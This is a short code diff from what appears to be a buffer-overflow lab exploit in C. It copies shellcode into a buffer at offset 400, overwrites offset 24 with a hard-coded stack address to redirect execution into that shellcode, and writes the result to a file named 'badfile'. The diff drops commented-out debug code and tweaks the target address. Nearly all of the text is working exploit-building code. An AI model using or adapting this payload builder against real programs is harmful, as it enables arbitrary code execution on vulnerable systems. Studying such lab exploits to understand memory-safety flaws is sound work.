@@ -31,14 +31,9 @@ void main(int argc, char **argv)
 	   contents here. To set an address at location X
 	   with respect to the buffer, use the following format: 
 	   *(long *) &buffer[X] = addr; */
-	//printf("shellsize: %d", sizeof(shellcode));
-	//int i = 0;
-	//int offset = sizeof(buffer)-sizeof(shellcode)-1;
-	//for(; i < sizeof(shellcode); i++){
-	//	*(long*) &buffer[i + 400] = shellcode[i];
-	//} // addr = addr of code in buffer
+
 	memcpy(&buffer[400], shellcode, sizeof(shellcode));
-	*(long*) &buffer[24] = 0xbffff090 + 400; // @ code in buffer	
+	*(long*) &buffer[24] = 0xbffff090 + 390; // &buffer
 	/* Save the contents to the file "badfile" */
 	badfile = fopen("./badfile", "w");
 	fwrite(buffer, sizeof(buffer), 1, badfile);
